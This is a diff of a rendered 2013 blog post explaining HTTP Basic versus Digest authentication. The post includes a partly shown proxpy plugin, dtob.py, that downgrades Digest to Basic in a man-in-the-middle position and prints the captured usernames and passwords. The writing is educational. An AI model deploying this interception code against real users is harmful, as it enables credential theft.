@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title> dtob.py: Digest to Basic authentication; A simple example of a authentication &#39;downgrade&#39; attack | #!/slash/note</title>
+  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/'>
   <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
@@ -13,8 +18,8 @@
 Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2013-06-25T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2013-06-25T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2013-06-25T00:00:00+00:00" />
+<meta property="article:modified_time" content="2013-06-25T00:00:00+00:00" />
 
 
   <meta name="twitter:card" content="summary"/>
@@ -24,8 +29,11 @@ Lets start by saying that I am by no means an expert at any of what I am about t
 
   
   
+    
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
   
    <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
   
@@ -36,7 +44,7 @@ Lets start by saying that I am by no means an expert at any of what I am about t
   
 
   
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
 
   
   
@@ -64,8 +72,8 @@ if (!doNotTrack) {
 
   <div id="header-post">
   <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
   <span id="menu" style="visibility: visible;">
     <span id="nav">
       <ul>
@@ -85,25 +93,25 @@ if (!doNotTrack) {
       <ul>
         
         <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2013/06/23/quick-win-quickly-execute-last-shell-command/">
+          <a class="icon" href=" https://leonjza.github.io/blog/2013/06/23/quick-win-quickly-execute-last-shell-command/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2013/07/27/stuff-to-gource./">
+          <a class="icon" href="https://leonjza.github.io/blog/2013/07/27/stuff-to-gource./" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
         
         <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
         </li>
         <li>
-          <a class="icon" href="#">
+          <a class="icon" href="#" aria-label="Share">
             <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
           </a>
         </li>
@@ -123,57 +131,47 @@ if (!doNotTrack) {
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&is_video=false&description=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&is_video=false&description=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f">
+    <a class="icon" href="mailto:?subject=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
-      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
-      <i class="fab fa-digg " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&name=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&description=%3ch3%20id%3d%22introduction%22%3eIntroduction%3c%2fh3%3e%0a%3cp%3eLets%20start%20by%20saying%20that%20I%20am%20by%20%3cem%3eno%3c%2fem%3e%20means%20an%20expert%20at%20any%20of%20what%20I%20am%20about%20to%20write.%20Primarily%20this%20post%20is%20purely%20for%20research%20purposes.%20Think%20of%20it%20as%20one%20of%20those%20%3cem%3esomething%20to%20do%3c%2fem%3e%20scenarios.%20I%26rsquo%3bd%20like%20to%20cover%20some%20basics%20around%20HTTP%20Authentication%2c%20and%20then%20show%20a%20PoC%20of%20how%20this%20can%20be%20abused%20in%20a%20real%20world%20scenario.%20Hopefully%20this%20will%20help%20educate%20people%20to%20use%20more%20secure%20authentication%20mechanisms%21%20%3a%29%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&name=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&description=%3ch3%20id%3d%22introduction%22%3eIntroduction%3c%2fh3%3e%0a%3cp%3eLets%20start%20by%20saying%20that%20I%20am%20by%20%3cem%3eno%3c%2fem%3e%20means%20an%20expert%20at%20any%20of%20what%20I%20am%20about%20to%20write.%20Primarily%20this%20post%20is%20purely%20for%20research%20purposes.%20Think%20of%20it%20as%20one%20of%20those%20%3cem%3esomething%20to%20do%3c%2fem%3e%20scenarios.%20I%26rsquo%3bd%20like%20to%20cover%20some%20basics%20around%20HTTP%20Authentication%2c%20and%20then%20show%20a%20PoC%20of%20how%20this%20can%20be%20abused%20in%20a%20real%20world%20scenario.%20Hopefully%20this%20will%20help%20educate%20people%20to%20use%20more%20secure%20authentication%20mechanisms%21%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&t=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&t=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -218,35 +216,29 @@ if (!doNotTrack) {
       </h1>
       <div class="meta">
         
-        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <span itemprop="name">
-            
-              #!/slash/note
-            
-          </span>
-        </span>
-        
         <div class="postdate">
           
           <time datetime="2013-06-25 00:00:00 &#43;0000 UTC" itemprop="datePublished">2013-06-25</time>
           
         </div>
         
+        
+        
         <div class="article-category">
-          <i class="fas fa-archive"></i>
-          
-          
-          <a class="category-link" href="https://leonjza.github.io/categories/proxy">proxy</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/digest-authentication">digest authentication</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/basic-authentication">basic authentication</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/mitm">mitm</a>
-          
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/proxy">proxy</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/digest-authentication">digest authentication</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/basic-authentication">basic authentication</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/mitm">mitm</a>
+            
         </div>
         
         
@@ -265,7 +257,7 @@ HTTP level authentication mechanisms include <a href="http://tools.ietf.org/html
 <h3 id="http-basic-authentication">HTTP Basic Authentication</h3>
 <p>Basic authentication is considered the <em>least secure</em> method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a <strong>encoding</strong> scheme, and <strong>not</strong> an encryption scheme [<a href="http://en.wikipedia.org/wiki/Base64">1</a>].</p>
 <p>To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET /auth/basic/ HTTP/1.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET /auth/basic/ HTTP/1.1
 Host: test.dev
 Proxy-Connection: keep-alive
 Cache-Control: max-age=0
@@ -275,7 +267,7 @@ DNT: 1
 Accept-Encoding: gzip,deflate,sdch
 Accept-Language: en-US,en;q=0.8,af;q=0.6
 </code></pre></div><p>The website, configured to use basic authentication, will see that there is no <code>Authorisation</code> header presented by the client, and respond with a <code>401</code>, as well as a <code>WWW-Authenticate</code> header.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.0 401 Unauthorised
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.0 401 Unauthorised
 Date: Tue, 25 Jun 2013 17:33:37 GMT
 Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
 X-Powered-By: PHP/5.3.15
@@ -287,7 +279,7 @@ Content-Type: text/html
 Text to send if user hits Cancel button
 </code></pre></div><p>The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the <code>WWW-Authenticate</code> header, this mechanism should be <code>Basic</code> for the realm <em>Basic Auth Testing</em>. Don&rsquo;t stress too much about the realm part. In short, this is usually used to give the user a short message like &ldquo;Restricted Area&rdquo; etc.
 In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the <code>Authorisation</code> header.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET /auth/basic/ HTTP/1.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET /auth/basic/ HTTP/1.1
 Host: test.dev
 Proxy-Connection: keep-alive
 Cache-Control: max-age=0
@@ -302,7 +294,7 @@ This header now needs to be present in every request that is made to the website
 <h4 id="ok-so-what">Ok, so what?</h4>
 <p>So lets take a moment and relook at the <code>Authorisation</code> header. <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>
 Lets strip the <em>Authorisation: Basic</em> section and just work with the <code>dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>. We will echo this, and pipe it through a base64 decoder in a shell session:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#87ceeb">&#34;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&#34;</span> | base64 -d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#87ceeb">&#34;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&#34;</span> | base64 -d
 user.name:s3cr3tP@ssw0rd
 $
 </code></pre></div><p>Yup, thats it&hellip;</p>
@@ -311,12 +303,12 @@ $
 <h3 id="http-digest-authentication">HTTP Digest Authentication</h3>
 <p>Digest authentication is considered to be <em>more</em> secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the <code>WWW-Authenticate</code> and <code>Authorisation</code> headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!</p>
 <p>Lets look at an example, and then dig into the details. Requesting a digest protected web resource @<em>/login</em> without a valid <code>Authorisation</code> header, will cause our sample application to respond with a <code>401</code> and a <code>WWW-Authenticate</code> header as follows:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">WWW-Authenticate: Digest realm=&#34;test.dev&#34;,qop=&#34;auth&#34;,nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;,opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">WWW-Authenticate: Digest realm=&#34;test.dev&#34;,qop=&#34;auth&#34;,nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;,opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;
 </code></pre></div><p>Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following <code>Authorisation</code> header:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Authorisation: Digest username=&#34;user.name&#34;, realm=&#34;test.dev&#34;, nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;, uri=&#34;/login&#34;, response=&#34;70eda34f1683041fd9ab72056c51b740&#34;, opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;, qop=auth, nc=00000001, cnonce=&#34;61417766e50cb980&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Authorisation: Digest username=&#34;user.name&#34;, realm=&#34;test.dev&#34;, nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;, uri=&#34;/login&#34;, response=&#34;70eda34f1683041fd9ab72056c51b740&#34;, opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;, qop=auth, nc=00000001, cnonce=&#34;61417766e50cb980&#34;
 </code></pre></div><p>Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article <a href="http://en.wikipedia.org/wiki/Digest_access_authentication#Overview">here</a>, or the official RFC <a href="http://tools.ietf.org/html/rfc2069#section-2.1.2">here</a> to help us understand what is going on here.</p>
 <p>According to the Wikipedia article, the response <code>Authorisation</code> header for Digest authentication for <a href="http://tools.ietf.org/html/rfc2617#section-3.2.2">RFC 2617</a> is calculated as follows:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># If the algorithm directive in the WWW-Authenticate header is &#39;MD5&#39; or unspecified</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># If the algorithm directive in the WWW-Authenticate header is &#39;MD5&#39; or unspecified</span>
 <span style="color:#eedd82">ha1</span> = md5(username : realm : password)
 <span style="color:#0f0"># Else, if the algorithm directive is &#39;MD5-Sess&#39;, the nonce and client nonce becomes part of ha1</span>
 <span style="color:#eedd82">ha1</span> = md5(md5(username : realm : password) : nonce : cnonce)
@@ -332,7 +324,7 @@ $
 <span style="color:#0f0"># Else, if qop is unspecified</span>
 <span style="color:#eedd82">response</span> = md5(ha1 : nonce : ha2)
 </code></pre></div><p>So, lets take this formula, step by step and try and replicate the response <code>Authorisation</code> header in a shell. If one of the <code>WWW-Authenticate</code> headers don&rsquo;t make sense then I&rsquo;ll highly reccomend you read the RFC.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># Example of Calculating a Digest Authentication Response</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># Example of Calculating a Digest Authentication Response</span>
 <span style="color:#0f0"># header in a shell with a qop of &#34;auth&#34;</span>
 
 <span style="color:#0f0"># Assign some values to variables. These values will come from the above headers</span>
@@ -378,7 +370,7 @@ $ print <span style="color:#eedd82">$response</span>
 <h3 id="enough-talk-poc">Enough talk, PoC!</h3>
 <p>Using <a href="https://code.google.com/p/proxpy/">proxpy</a>, which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn&rsquo;t work very well, but this is only meant to demonstrate the problem.</p>
 <h4 id="the-plugin">The plugin</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0"># dtob.py</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0"># dtob.py</span>
 <span style="color:#0f0"># Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)</span>
 <span style="color:#0f0">#</span>
 <span style="color:#0f0"># 2013 Leon Jacobs</span>
@@ -389,8 +381,8 @@ $ print <span style="color:#eedd82">$response</span>
 <span style="color:#f00">def</span> <span style="color:#ff0">headerCleanup</span>(v):
 
     <span style="color:#0f0"># strip annoying bracket things</span>
-    v = v.translate(None, <span style="color:#87ceeb">&#34;&#39;[</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#39;&#34;</span>)
-    v = v.translate(None, <span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#39;]&#39;&#34;</span>)
+    v = v.translate(<span style="color:#f00">None</span>, <span style="color:#87ceeb">&#34;&#39;[</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#39;&#34;</span>)
+    v = v.translate(<span style="color:#f00">None</span>, <span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#39;]&#39;&#34;</span>)
 
     <span style="color:#0f0"># convert it to a list</span>
     headers = v.split(<span style="color:#87ceeb">&#39;, &#39;</span>)
@@ -404,13 +396,13 @@ $ print <span style="color:#eedd82">$response</span>
     headers = headerCleanup(v)
 
     <span style="color:#f00">if</span> <span style="color:#87ceeb">&#39;Basic&#39;</span> in headers[<span style="color:#f60">0</span>]:
-        <span style="color:#f00">print</span> <span style="color:#87ceeb">&#34;[*] Basic Auth Response Detected.&#34;</span>
+        print <span style="color:#87ceeb">&#34;[*] Basic Auth Response Detected.&#34;</span>
         credentials = headers[<span style="color:#f60">0</span>].split(<span style="color:#87ceeb">&#34; &#34;</span>)
         credentials = base64.b64decode(credentials[<span style="color:#f60">1</span>]).split(<span style="color:#87ceeb">&#34;:&#34;</span>)
-        <span style="color:#f00">print</span> <span style="color:#87ceeb">&#34;[!] Found username &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; and password &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; for URL </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (credentials[<span style="color:#f60">0</span>], credentials[<span style="color:#f60">1</span>], str(req.url))
+        print <span style="color:#87ceeb">&#34;[!] Found username &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; and password &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; for URL </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (credentials[<span style="color:#f60">0</span>], credentials[<span style="color:#f60">1</span>], str(req.url))
 
     <span style="color:#f00">if</span> <span style="color:#87ceeb">&#39;Digest&#39;</span> in headers[<span style="color:#f60">0</span>]:
-        <span style="color:#f00">print</span> <span style="color:#87ceeb">&#34;[x] Aww, the client responded with a Digest. </span><span style="color:#87ceeb">\&#34;</span><span style="color:#87ceeb">Were too late!</span><span style="color:#87ceeb">\&#34;</span><span style="color:#87ceeb"> :(&#34;</span>
+        print <span style="color:#87ceeb">&#34;[x] Aww, the client responded with a Digest. </span><span style="color:#87ceeb">\&#34;</span><span style="color:#87ceeb">Were too late!</span><span style="color:#87ceeb">\&#34;</span><span style="color:#87ceeb"> :(&#34;</span>
 
     <span style="color:#f00">return</span> req
 
@@ -424,7 +416,7 @@ $ print <span style="color:#eedd82">$response</span>
 
         <span style="color:#0f0"># Swap out Digest for Basic :&gt;</span>
         header = str(headers[<span style="color:#f60">0</span>])
-        <span style="color:#f00">print</span> <span style="color:#87ceeb">&#34;[*] Found digest auth. Masquerading the response with a basic one :&gt;&#34;</span>
+        print <span style="color:#87ceeb">&#34;[*] Found digest auth. Masquerading the response with a basic one :&gt;&#34;</span>
         res.setHeader(<span style="color:#87ceeb">&#34;WWW-Authenticate&#34;</span>, <span style="color:#87ceeb">&#34;Basic realm=pwnd&#34;</span>)
